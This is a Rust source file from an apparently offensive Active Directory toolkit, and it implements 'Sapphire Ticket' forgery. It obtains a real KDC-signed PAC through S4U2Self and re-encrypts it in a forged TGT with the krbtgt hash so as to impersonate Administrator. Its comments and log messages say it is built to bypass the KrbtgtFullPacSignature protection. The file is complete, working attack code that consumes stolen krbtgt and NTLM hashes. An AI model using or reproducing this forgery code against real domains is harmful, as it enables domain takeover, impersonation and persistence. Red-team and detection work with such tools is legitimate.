//! Sapphire Ticket — the evolution beyond Diamond that defeats KrbtgtFullPacSignature.
//!
//! ## How It Works
//!
//! 1. Request a legitimate TGT for a user whose password we control
//! 2. Use S4U2Self to obtain a service ticket for that same user
//! 3. Decrypt the service ticket with the user's long-term key (NTLM hash for RC4)
//! 4. Extract the KDC-issued PAC from the decrypted ticket's authorization-data
//! 5. Build a new EncTicketPart with our target cname but the *original* KDC-signed PAC
//! 6. Encrypt with the krbtgt key and save
//!
//! Because the PAC is **exactly** what the KDC issued (unmodified), the KDC checksum is
//! intact, the KDC_ISSUED flag is set, and KrbtgtFullPacSignature passes. The TGT's cname
//! is changed to Administrator (or whoever), but the PAC carries the group SIDs from the
//! original user — so the technique works best when the user we S4U2Self-for is already a DA.

use chrono::{Duration, Utc};
use kerberos_asn1::{
    Asn1Object, EncTicketPart, EncryptedData, PrincipalName, Ticket, TransitedEncoding,
};
use kerberos_crypto::new_kerberos_cipher;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{
    self, ETYPE_AES256_CTS, ETYPE_RC4_HMAC, NT_PRINCIPAL, NT_SRV_INST,
};
use tracing::info;

use crate::golden;
use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
use crate::validate;

/// Forge a Sapphire Ticket — a TGT with a real KDC-issued PAC.
pub async fn forge_sapphire_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
    info!("[sapphire] Forging Sapphire Ticket for {}", config.domain);

    let krbtgt_hash = config
        .krbtgt_hash
        .as_deref()
        .or(config.krbtgt_aes256.as_deref())
        .ok_or_else(|| {
            OverthroneError::TicketForge("krbtgt hash is required for Sapphire Ticket".into())
        })?;

    let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
        OverthroneError::TicketForge("Domain SID is required for Sapphire Ticket".into())
    })?;

    validate::validate_sid_format(domain_sid)?;

    // Step 1: Request a legitimate TGT (via PKINIT, password, or NTLM hash)
    info!("[sapphire] Step 1: Requesting TGT as {}", config.username);
    let user_tgt = config.request_user_tgt().await?;

    info!(
        "[sapphire] TGT obtained (etype: {})",
        user_tgt.session_key_etype
    );

    // For the decrypt step we still need the user's long-term key (password or nt_hash)
    let password = config.password.as_deref();
    let nt_hash = config.nt_hash.as_deref();
    if password.is_none() && nt_hash.is_none() {
        return Err(OverthroneError::TicketForge(
            "Password or NTLM hash is required for Sapphire Ticket (to decrypt S4U2Self ticket)".into(),
        ));
    }

    let impersonate = config.effective_impersonate();

    // Step 2: S4U2Self to get a service ticket for the impersonate user
    info!("[sapphire] Step 2: S4U2Self as {impersonate}");
    let s4u2_self = kerberos::s4u2self(&config.dc_ip, &user_tgt, impersonate).await?;

    info!(
        "[sapphire] S4U2Self ticket obtained (ticket etype: {})",
        s4u2_self.ticket.enc_part.etype
    );

    // Step 3: Derive the user key and decrypt the ticket enc-part
    // The service ticket is encrypted with the user's long-term key
    info!("[sapphire] Step 3: Decrypting service ticket with user key");
    let ticket_etype = s4u2_self.ticket.enc_part.etype;

    let user_key = derive_user_key(password, nt_hash, &config.domain, impersonate, ticket_etype)?;

    let cipher = new_kerberos_cipher(ticket_etype)
        .map_err(|e| OverthroneError::TicketForge(format!("Cipher init: {e}")))?;

    // TGS-REP service tickets use key_usage = 7 per RFC 4120 §7.5.1
    let decrypted = cipher
        .decrypt(&user_key, 7, &s4u2_self.ticket.enc_part.cipher)
        .map_err(|e| {
            OverthroneError::TicketForge(format!(
                "S4U2Self ticket decrypt failed (etype {ticket_etype}): {e}"
            ))
        })?;

    let (_, enc_ticket) = EncTicketPart::parse(&decrypted)
        .map_err(|e| OverthroneError::TicketForge(format!("Parse EncTicketPart: {e}")))?;

    // Step 4: Extract the KDC-issued PAC from authorization-data
    info!("[sapphire] Step 4: Extracting KDC-issued PAC");
    let pac_bytes = extract_pac(&enc_ticket)?;
    info!(
        "[sapphire] PAC extracted ({} bytes) — this is the KDC-signed original",
        pac_bytes.len()
    );

    // Step 5: Build the enc-part for the krbtgt key (change cname to impersonate target)
    // but keep the original KDC-issued PAC intact
    info!("[sapphire] Step 5: Forging TGT with real KDC-signed PAC");

    let krbtgt_key = hex::decode(krbtgt_hash.trim())
        .map_err(|e| OverthroneError::TicketForge(format!("Invalid krbtgt hash: {e}")))?;

    let krbtgt_etype = match krbtgt_key.len() {
        16 => ETYPE_RC4_HMAC,
        32 => ETYPE_AES256_CTS,
        _ => {
            return Err(OverthroneError::TicketForge(format!(
                "krbtgt key must be 16 or 32 bytes, got {}",
                krbtgt_key.len()
            )));
        }
    };

    let realm = config.domain.to_uppercase();
    let groups = config.effective_groups();
    let lifetime = config.effective_lifetime();
    let now = Utc::now();
    let session_key = golden::generate_session_key(krbtgt_etype);

    let new_enc_ticket = EncTicketPart {
        flags: ticket_flags_sapphire(),
        key: kerberos_asn1::EncryptionKey {
            keytype: krbtgt_etype,
            keyvalue: session_key.clone(),
        },
        crealm: realm.clone(),
        cname: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![impersonate.to_string()],
        },
        transited: TransitedEncoding {
            tr_type: 1,
            contents: Vec::new(),
        },
        authtime: kerberos_asn1::KerberosTime::from(now),
        starttime: Some(kerberos_asn1::KerberosTime::from(now)),
        endtime: kerberos_asn1::KerberosTime::from(now + Duration::hours(lifetime as i64)),
        renew_till: Some(kerberos_asn1::KerberosTime::from(now + Duration::days(7))),
        caddr: None,
        authorization_data: Some(vec![kerberos_asn1::AuthorizationDataEntry {
            ad_type: 1,
            ad_data: pac_bytes,
        }]),
    };

    let krbtgt_cipher = new_kerberos_cipher(krbtgt_etype)
        .map_err(|e| OverthroneError::TicketForge(format!("Cipher: {e}")))?;

    let encrypted = krbtgt_cipher.encrypt(&krbtgt_key, 2, &new_enc_ticket.build());

    let forged_ticket = Ticket {
        tkt_vno: 5,
        realm: realm.clone(),
        sname: PrincipalName {
            name_type: NT_SRV_INST,
            name_string: vec!["krbtgt".to_string(), realm.clone()],
        },
        enc_part: EncryptedData {
            etype: krbtgt_etype,
            kvno: Some(2),
            cipher: encrypted,
        },
    };

    let ticket_bytes = forged_ticket.build();
    let kirbi_bytes =
        golden::build_krb_cred(&forged_ticket, &new_enc_ticket, &session_key, krbtgt_etype)?;
    let kirbi_path = golden::save_ticket(config, &kirbi_bytes, "sapphire")?;
    let etype_str = golden::etype_name(krbtgt_etype);

    info!(
        "[sapphire] Sapphire Ticket forged ({} bytes, {})",
        ticket_bytes.len(),
        etype_str
    );

    Ok(ForgeResult {
        action: "Sapphire Ticket".into(),
        domain: config.domain.clone(),
        success: true,
        ticket_data: Some(ForgedTicket {
            ticket_type: "Sapphire Ticket (KDC-issued PAC)".into(),
            impersonated_user: impersonate.to_string(),
            domain: realm.clone(),
            spn: format!("krbtgt/{}", realm),
            encryption_type: etype_str.into(),
            valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
            valid_until: (now + Duration::hours(lifetime as i64))
                .format("%Y-%m-%d %H:%M:%S UTC")
                .to_string(),
            group_rids: groups,
            extra_sids: config.extra_sids.clone(),
            kirbi_path,
            ccache_path: None,
            kirbi_base64: Some(golden::base64_encode(&kirbi_bytes)),
            ticket_size_bytes: ticket_bytes.len(),
        }),
        persistence_result: None,
        message: format!(
            "Sapphire Ticket forged: {} as {} ({}) — real KDC-signed PAC bypasses KrbtgtFullPacSignature",
            realm, impersonate, etype_str
        ),
    })
}

fn ticket_flags_sapphire() -> kerberos_asn1::KerberosFlags {
    kerberos_asn1::KerberosFlags { flags: 0x40E00000 }
}

fn derive_user_key(
    password: Option<&str>,
    nt_hash: Option<&str>,
    realm: &str,
    username: &str,
    etype: i32,
) -> Result<Vec<u8>> {
    match etype {
        ETYPE_RC4_HMAC => {
            if let Some(hash) = nt_hash {
                Ok(hex::decode(hash.trim()).map_err(|e| {
                    OverthroneError::TicketForge(format!("Invalid nt_hash hex: {e}"))
                })?)
            } else if let Some(pwd) = password {
                Ok(overthrone_core::proto::ntlm::nt_hash(pwd))
            } else {
                Err(OverthroneError::TicketForge(
                    "Password or NTLM hash required for RC4 key derivation".into(),
                ))
            }
        }
        ETYPE_AES256_CTS | 17 => {
            let pwd = password.ok_or_else(|| {
                OverthroneError::TicketForge(
                    "Cleartext password required for AES key derivation (NTLM hash is insufficient)"
                        .into(),
                )
            })?;
            let cipher = new_kerberos_cipher(etype)
                .map_err(|e| OverthroneError::TicketForge(format!("Cipher init: {e}")))?;
            let salt = cipher.generate_salt(realm, username);
            Ok(cipher.generate_key_from_string(pwd, &salt))
        }
        _ => Err(OverthroneError::TicketForge(format!(
            "Unsupported etype: {etype}"
        ))),
    }
}

fn extract_pac(enc_ticket: &EncTicketPart) -> Result<Vec<u8>> {
    let auth_data = enc_ticket
        .authorization_data
        .as_ref()
        .and_then(|d| d.first())
        .ok_or_else(|| {
            OverthroneError::TicketForge("No authorization-data found in S4U2Self ticket".into())
        })?;

    Ok(auth_data.ad_data.clone())
}
